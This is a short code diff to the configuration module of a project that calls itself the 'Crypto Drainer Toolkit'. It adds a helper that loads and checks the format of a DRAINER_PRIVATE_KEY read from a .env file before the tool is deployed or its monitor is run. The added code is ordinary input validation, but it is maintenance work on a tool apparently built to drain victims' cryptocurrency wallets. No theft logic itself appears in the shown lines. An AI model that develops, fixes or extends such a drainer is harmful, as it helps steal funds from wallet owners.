@@ -4,12 +4,30 @@ Configuration for the Crypto Drainer Toolkit.
 Loads sensitive values from .env file.
 """
 import os
+import re
 from pathlib import Path
 from dotenv import load_dotenv
 
 # Load environment variables from .env file
 env_path = Path(__file__).resolve().parent.parent / ".env"
 load_dotenv(env_path)
+
+
+def normalize_private_key(value):
+    """Return a valid 0x-prefixed private key or raise a clear error."""
+    if not value:
+        raise ValueError("DRAINER_PRIVATE_KEY is empty. Set it in .env before deploying or running the monitor.")
+
+    value = value.strip()
+    if value.startswith("0x"):
+        value = value[2:]
+
+    if len(value) != 64 or not re.fullmatch(r"[0-9a-fA-F]{64}", value):
+        raise ValueError(
+            "DRAINER_PRIVATE_KEY must be a 64-character hex string (with or without 0x)."
+        )
+
+    return "0x" + value
 
 # ============================================================
 # NETWORK CONFIGURATION
